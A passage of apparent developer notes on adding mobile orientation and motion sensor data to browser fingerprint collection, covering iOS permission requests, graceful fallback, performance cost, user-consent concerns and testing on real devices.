- [ ] Validate server-side validation still works with new data

---

## ⚠️ IMPORTANT NOTES

1. **iOS Permission Requirements**: iOS 13+ requires explicit permission for DeviceOrientationEvent and DeviceMotionEvent. The code handles this with `requestPermission()`.

2. **Graceful Degradation**: All sensor collection code should handle cases where:
   - Device doesn't support sensors
   - Permission is denied
   - Sensors are not available
   - Desktop browsers (should return empty arrays)

3. **Performance**: Sensor collection adds ~2-10 seconds to fingerprint collection time. Consider making it optional or async.

4. **Privacy**: Mobile sensor collection may trigger privacy warnings. Ensure proper user consent if required by regulations.

5. **Testing**: Test on real mobile devices, not just desktop browsers with mobile emulation (sensors may not work in emulation).

